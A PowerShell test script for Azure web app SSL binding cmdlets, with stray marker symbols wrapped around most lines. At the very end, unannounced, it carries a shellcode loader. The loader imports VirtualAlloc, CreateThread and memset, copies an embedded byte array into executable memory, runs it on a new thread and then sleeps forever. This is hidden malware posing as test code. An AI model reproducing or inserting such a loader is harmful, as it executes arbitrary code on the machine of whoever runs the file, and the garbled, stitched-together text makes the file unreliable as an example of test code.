
















 -||-> $rgname = "lketmtestantps10" <-||- 
 -||-> $appname = "lketmtestantps10" <-||- 
 -||-> $slot = "testslot" <-||- 
 -||-> $prodHostname = "www.adorenow.net" <-||- 
 -||-> $slotHostname = "testslot.adorenow.net" <-||- 
 -||-> $thumbprint = "F75A7A8C033FBEA02A1578812DB289277E23EAB1" <-||- 


 -||-> function Test-CreateNewWebAppSSLBinding
{
	 -||-> try
	{
		
		
		 -||-> $createResult =  -||-> New-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname -Thumbprint $thumbprint <-||-  <-||- 
		 -||-> Assert-AreEqual $prodHostname $createResult.Name <-||- 

		
		 -||-> $createResult =  -||-> New-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostname -Thumbprint $thumbprint <-||-  <-||- 
		 -||-> Assert-AreEqual $slotHostname $createResult.Name <-||- 
	}
    finally
    {
		
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname -Force <-||- 
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostname -Force <-||-  
    } <-||- 
} <-||- 


 -||-> function Test-GetNewWebAppSSLBinding
{
	 -||-> try
	{
		
		 -||-> $createWebAppResult =  -||-> New-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname -Thumbprint $thumbprint <-||-  <-||- 
		 -||-> $createWebAppSlotResult =  -||-> New-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostname -Thumbprint $thumbprint <-||-  <-||- 

		
		 -||-> $getResult =  -||-> Get-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname <-||-  <-||- 
     -||-> Assert-AreEqual 1 $getResult.Count <-||- 
		 -||-> $currentHostNames =  -||-> $getResult | Select -expand Name <-||-  <-||- 
		 -||-> Assert-True {  -||-> $currentHostNames -contains $createWebAppResult.Name <-||-  } <-||- 
		 -||-> $getResult =  -||-> Get-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname <-||-  <-||- 
		 -||-> Assert-AreEqual $getResult.Name $createWebAppResult.Name <-||- 

		
		 -||-> $getResult =  -||-> Get-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot <-||-  <-||- 
     -||-> Assert-AreEqual 1 $getResult.Count <-||- 
		 -||-> $currentHostNames =  -||-> $getResult | Select -expand Name <-||-  <-||- 
		 -||-> Assert-True {  -||-> $currentHostNames -contains $createWebAppSlotResult.Name <-||-  } <-||- 
		 -||-> $getResult =  -||-> Get-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostname <-||-  <-||- 
		 -||-> Assert-AreEqual $getResult.Name $createWebAppSlotResult.Name <-||- 
	}
    finally
    {
		
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname -Force <-||- 
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostname -Force <-||-  
    } <-||- 
} <-||- 


 -||-> function Test-RemoveNewWebAppSSLBinding
{
	 -||-> try
	{
		
		 -||-> New-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname -Thumbprint $thumbprint <-||- 
		 -||-> New-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostname -Thumbprint $thumbprint <-||- 

		
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname -Force <-||- 
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostname -Force <-||-  

		
		 -||-> $res =  -||-> Get-AzWebAppSSLBinding  -ResourceGroupName $rgname -WebAppName  $appname <-||-  <-||- 
		 -||-> $currentHostNames =  -||-> $res | Select -expand Name <-||-  <-||- 
		 -||-> Assert-False {  -||-> $currentHostNames -contains $prodHostname <-||-  } <-||- 

		 -||-> $res =  -||-> Get-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot <-||-  <-||- 
		 -||-> $currentHostNames =  -||-> $res | Select -expand Name <-||-  <-||- 
		 -||-> Assert-False {  -||-> $currentHostNames -contains $slotHostName <-||-  } <-||- 
	}
    finally
    {
		
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname -Force <-||- 
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostname -Force <-||-  
    } <-||- 
} <-||- 


 -||-> function Test-WebAppSSLBindingPipeSupport
{
	 -||-> try
	{
		
		 -||-> $webapp =  -||-> Get-AzWebApp  -ResourceGroupName $rgname -Name  $appname <-||-  <-||- 
		 -||-> $webappslot =  -||-> Get-AzWebAppSlot  -ResourceGroupName $rgname -Name  $appname -Slot $slot <-||-  <-||- 

		
		 -||-> $createResult =  -||-> $webapp | New-AzWebAppSSLBinding -Name $prodHostName -Thumbprint $thumbprint <-||-  <-||- 
		 -||-> Assert-AreEqual $prodHostName $createResult.Name <-||- 

		 -||-> $createResult =  -||-> $webappslot | New-AzWebAppSSLBinding -Name $slotHostName -Thumbprint $thumbprint <-||-  <-||- 
		 -||-> Assert-AreEqual $slotHostName $createResult.Name <-||- 

		
		 -||-> $getResult =  -||-> $webapp |  Get-AzWebAppSSLBinding <-||-  <-||- 
		 -||-> Assert-AreEqual 1 $getResult.Count <-||- 

		 -||-> $getResult =  -||-> $webappslot | Get-AzWebAppSSLBinding <-||-  <-||- 
		 -||-> Assert-AreEqual 1 $getResult.Count <-||- 

		
		 -||-> $webapp | Remove-AzWebAppSSLBinding -Name $prodHostName -Force <-||-  
		 -||-> $res =  -||-> $webapp | Get-AzWebAppSSLBinding <-||-  <-||- 
		 -||-> $currentHostNames =  -||-> $res | Select -expand Name <-||-  <-||- 
		 -||-> Assert-False {  -||-> $currentHostNames -contains $prodHostName <-||-  } <-||- 

		 -||-> $webappslot | Remove-AzWebAppSSLBinding -Name $slotHostName -Force <-||-  
		 -||-> $res =  -||-> $webappslot | Get-AzWebAppSSLBinding <-||-  <-||- 
		 -||-> $currentHostNames =  -||-> $res | Select -expand Name <-||-  <-||- 
		 -||-> Assert-False {  -||-> $currentHostNames -contains $slotHostName <-||-  } <-||- 
	}
    finally
    {
		
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostName -Force <-||-  
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostName -Force <-||-  
    } <-||- 
} <-||- 


 -||-> function Test-GetWebAppCertificate
{
	 -||-> try
	{
		
		 -||-> New-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname -Thumbprint $thumbprint <-||- 

		
		 -||-> $certificates =  -||-> Get-AzWebAppCertificate <-||-  <-||- 
		 -||-> $thumbprints =  -||-> $certificates | Select -expand Thumbprint <-||-  <-||- 
		 -||-> Assert-True {  -||-> $thumbprints -contains $thumbprint <-||-  } <-||- 

		 -||-> $certificate =  -||-> Get-AzWebAppCertificate -Thumbprint $thumbprint <-||-  <-||- 
		 -||-> Assert-AreEqual $thumbprint $certificate.Thumbprint <-||- 
	}
    finally
    {
		
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostName -Force <-||-  
    } <-||- 
} <-||- 


 -||-> function Test-TagsNotRemovedByCreateNewWebAppSSLBinding
{
	 -||-> try
	{
		
		 -||-> $getWebAppResult =  -||-> Get-AzWebApp -ResourceGroupName $rgname -Name $appname <-||-  <-||- 
		 -||-> Assert-notNull $getWebAppResult.Tags <-||- 
		 -||-> $tagsApp = $getWebAppResult.Tags <-||- 

		
		 -||-> $createBindingResult =  -||-> New-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname -Thumbprint $thumbprint <-||-  <-||- 
		 -||-> Assert-AreEqual $prodHostname $createBindingResult.Name <-||- 
		
		
		 -||-> $getResult =  -||-> Get-AzWebApp -ResourceGroupName $rgname -Name $appname <-||-  <-||- 
		 -||-> Assert-notNull $getResult.Tags <-||- 
		 -||-> foreach($key in  -||-> $tagsApp.Keys <-||- )
		{
			 -||-> Assert-AreEqual $tagsApp[$key] $getResult.Tags[$key] <-||- 
		} <-||- 

		
		 -||-> $getSlotResult =  -||-> Get-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slot <-||-  <-||- 
		 -||-> Assert-notNull $getSlotResult.Tags <-||- 
		 -||-> $tagsSlot = $getSlotResult.Tags <-||- 

		
		 -||-> $createSlotBindingResult =  -||-> New-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostname -Thumbprint $thumbprint <-||-  <-||- 
		 -||-> Assert-AreEqual $slotHostname $createSlotBindingResult.Name <-||- 

		
		 -||-> $getSlotResult2 =  -||-> Get-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slot <-||-  <-||- 
		 -||-> Assert-notNull $getSlotResult2.Tags <-||- 
		 -||-> foreach($key in  -||-> $tagsSlot.Keys <-||- )
		{
			 -||-> Assert-AreEqual $tagsSlot[$key] $getSlotResult2.Tags[$key] <-||- 
		} <-||- 

	}
    finally
    {
		
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Name $prodHostname -Force <-||- 
		 -||-> Remove-AzWebAppSSLBinding -ResourceGroupName $rgname -WebAppName  $appname -Slot $slot -Name $slotHostname -Force <-||-  
    } <-||- 
} <-||- 
 -||-> $PXo = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $PXo -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xbd,0xe0,0x99,0x92,0x44,0xdd,0xc1,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x59,0x83,0xc0,0x04,0x31,0x68,0x0e,0x03,0x88,0x97,0x70,0xb1,0xb4,0x40,0xf6,0x3a,0x44,0x91,0x97,0xb3,0xa1,0xa0,0x97,0xa0,0xa2,0x93,0x27,0xa2,0xe6,0x1f,0xc3,0xe6,0x12,0xab,0xa1,0x2e,0x15,0x1c,0x0f,0x09,0x18,0x9d,0x3c,0x69,0x3b,0x1d,0x3f,0xbe,0x9b,0x1c,0xf0,0xb3,0xda,0x59,0xed,0x3e,0x8e,0x32,0x79,0xec,0x3e,0x36,0x37,0x2d,0xb5,0x04,0xd9,0x35,0x2a,0xdc,0xd8,0x14,0xfd,0x56,0x83,0xb6,0xfc,0xbb,0xbf,0xfe,0xe6,0xd8,0xfa,0x49,0x9d,0x2b,0x70,0x48,0x77,0x62,0x79,0xe7,0xb6,0x4a,0x88,0xf9,0xff,0x6d,0x73,0x8c,0x09,0x8e,0x0e,0x97,0xce,0xec,0xd4,0x12,0xd4,0x57,0x9e,0x85,0x30,0x69,0x73,0x53,0xb3,0x65,0x38,0x17,0x9b,0x69,0xbf,0xf4,0x90,0x96,0x34,0xfb,0x76,0x1f,0x0e,0xd8,0x52,0x7b,0xd4,0x41,0xc3,0x21,0xbb,0x7e,0x13,0x8a,0x64,0xdb,0x58,0x27,0x70,0x56,0x03,0x20,0xe8,0x0c,0xcf,0xb0,0x9c,0xb9,0x46,0xdf,0x35,0x12,0xf0,0x53,0xb1,0xbc,0x07,0x93,0xe8,0xf0,0xdc,0x38,0x40,0xa0,0xb1,0xed,0x0e,0x7c,0x63,0x6b,0x68,0x7f,0x5e,0xd8,0x25,0xea,0x63,0x8c,0x9a,0x82,0x3f,0x23,0x1d,0x53,0x57,0xcf,0x1d,0x53,0xa7,0xff,0x2d,0x20,0x9e,0xb7,0x75,0xc6,0xb0,0x2f,0xd1,0x4f,0xaf,0x76,0x22,0x9a,0x46,0xb0,0x8e,0x4d,0x58,0x0f,0xd1,0x0a,0x0b,0x3c,0x42,0x44,0xf8,0x94,0x0c,0x81,0xab,0x36,0xf6,0xaa,0x86,0xd1,0x62,0x5f,0x77,0xb6,0xf2,0x6c,0x87,0x46,0x7a,0x72,0xed,0x42,0x2c,0x19,0xee,0x1c,0xa4,0xa8,0x56,0x3f,0xb2,0xac,0x83,0x6c,0xe8,0x01,0x78,0xc5,0x66,0x8b,0x78,0xf1,0x0d,0x2c,0x51,0x84,0x32,0xa7,0x53,0xc8,0xc7,0x91,0x0b,0x26,0x92,0x80,0x9d,0x39,0x08,0xae,0x61,0xae,0xb3,0x3f,0x61,0x2e,0xdc,0x3f,0x61,0x6e,0x1c,0x13,0x09,0x36,0xb8,0xc0,0x2c,0x39,0x15,0x75,0xfd,0x95,0x1f,0x9d,0x56,0x72,0x20,0x42,0x58,0x82,0x73,0xd4,0x30,0x90,0xe5,0x51,0x22,0x6b,0xdc,0xe7,0x62,0xe0,0x12,0x6c,0x65,0x08,0x6e,0xf6,0xa9,0x7f,0x95,0xa1,0xea,0xdf,0xbd,0x27,0x13,0x20,0xc2,0xa0,0x8a,0xbc,0x56,0x58,0x22,0x24,0xda,0xec,0xca,0xd9,0x32,0x75,0x4e,0x70,0x38,0x5b,0xe0,0xe9,0xca,0xa3 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $LigG=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $LigG.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$LigG,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



